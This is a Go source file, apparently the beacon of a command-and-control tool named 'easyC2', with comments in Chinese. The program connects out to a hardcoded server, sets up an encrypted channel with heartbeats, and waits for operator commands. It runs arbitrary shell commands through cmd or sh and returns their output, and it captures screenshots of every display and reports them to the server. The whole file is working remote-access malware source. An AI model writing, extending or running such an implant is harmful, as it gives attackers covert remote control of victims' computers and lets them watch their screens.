package main

import (
	"easyC2/common"
	"context"
	"fmt"
	"github.com/kbinani/screenshot"
	_ "image"
	_ "image/jpeg"
	"image/png"
	_ "image/png"
	"io/ioutil"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
)

// 获取系统临时目录
func getTempDir() string {
	if runtime.GOOS == "windows" {
		return "C:/temp"
	}
	return "/tmp"
}

// 获取系统截图目录
func getScreenshotDir() string {
	tempDir := getTempDir()
	return filepath.Join(tempDir, "screenshots")
}

func ScreenShot(conn *common.BeaconConnection) error {
	fmt.Println("开始截图...")
	
	// 检查是否支持截图
	n := screenshot.NumActiveDisplays()
	if n == 0 {
		return fmt.Errorf("未检测到显示器")
	}

	// 创建临时目录（如果不存在）
	screenshotDir := getScreenshotDir()
	err := os.MkdirAll(screenshotDir, os.ModePerm)
	if err != nil {
		return fmt.Errorf("创建截图目录失败: %v", err)
	}

	// 清理旧截图
	files, _ := ioutil.ReadDir(screenshotDir)
	for _, f := range files {
		if strings.HasPrefix(f.Name(), "screen_") {
			os.Remove(filepath.Join(screenshotDir, f.Name()))
		}
	}

	// 为每个显示器创建一个截图文件
	var filePaths []string

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			fmt.Println("截图失败:", err)
			continue
		}

		// 创建文件
		filename := fmt.Sprintf("screen_%d.png", i)
		filePath := filepath.Join(screenshotDir, filename)
		file, err := os.Create(filePath)
		if err != nil {
			fmt.Println("创建文件失败:", err)
			continue
		}

		// 编码为PNG
		if err := png.Encode(file, img); err != nil {
			fmt.Println("PNG编码失败:", err)
			file.Close()
			continue
		}

		file.Close()
		filePaths = append(filePaths, filePath)
		fmt.Println("已保存截图:", filePath)
	}

	if len(filePaths) == 0 {
		return fmt.Errorf("没有成功创建任何截图")
	}

	// 发送所有截图文件路径
	message := "SCREENSHOT_FILES:" + strings.Join(filePaths, ";")
	err = conn.SendData([]byte(message))
	if err != nil {
		fmt.Println("发送文件路径失败:", err)
		return err
	}

	return nil
}

func Conn(conn *common.BeaconConnection) {
	for {
		msg, err := conn.ReadMessage()
		if err != nil {
			fmt.Println("读取命令出错:", err)
			return
		}

		// 处理不同类型的消息
		switch msg.Type {
		case common.BeaconData:
			command := string(msg.Payload)
			fmt.Println("收到命令:", command)

			if command == "screenshot" {
				err := ScreenShot(conn)
				if err != nil {
					fmt.Println("截图失败:", err)
					conn.SendData([]byte("截图失败: " + err.Error()))
				}
			} else if strings.HasPrefix(command, "shell") {
				err := doCMD(conn, command)
				if err != nil {
					fmt.Println("执行命令失败:", err)
				}
			} else {
				fmt.Println("未知命令:", command)
			}

		case common.BeaconHeartbeat:
			// 回复心跳
			conn.SendMessage(common.BeaconHeartbeatAck, []byte("heartbeat_ack"))

		default:
			fmt.Printf("收到未知消息类型: %d\n", msg.Type)
		}
	}
}

// 获取系统shell命令
func getShellCommand() (string, []string) {
	switch runtime.GOOS {
	case "windows":
		return "cmd", []string{"/c"}
	case "linux", "darwin":
		return "sh", []string{"-c"}
	default:
		return "sh", []string{"-c"}
	}
}

func doCMD(conn *common.BeaconConnection, command string) error {
	// 添加命令执行超时控制
	trim := strings.TrimPrefix(command, "shell")
	trim = strings.TrimSpace(trim)

	// 创建带超时的上下文
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// 根据操作系统选择shell
	shell, args := getShellCommand()
	cmdArgs := append(args, trim)
	
	cmd := exec.CommandContext(ctx, shell, cmdArgs...)
	output, err := cmd.CombinedOutput() // 同时捕获标准输出和错误

	if err != nil {
		errMsg := fmt.Sprintf("命令执行失败: %s\n%s", err, output)
		conn.SendData([]byte(errMsg))
		return err
	}

	conn.SendData(output)
	return nil
}

const ServerIP string = "127.0.0.1:80"

func main() {
	// 连接到服务器
	dial, err := net.Dial("tcp", ServerIP)
	if err != nil {
		fmt.Println("连接服务器失败:", err)
		return
	}

	// 创建beacon连接
	beaconConn := common.NewBeaconConnection(dial)
	
	// 执行握手
	err = beaconConn.PerformHandshake()
	if err != nil {
		fmt.Println("握手失败:", err)
		dial.Close()
		return
	}

	// 执行密钥交换
	err = beaconConn.PerformKeyExchange()
	if err != nil {
		fmt.Println("密钥交换失败:", err)
		dial.Close()
		return
	}

	fmt.Println("已成功建立加密连接")

	// 启动心跳
	beaconConn.StartHeartbeat(30 * time.Second)

	// 开始处理命令
	Conn(beaconConn)
}
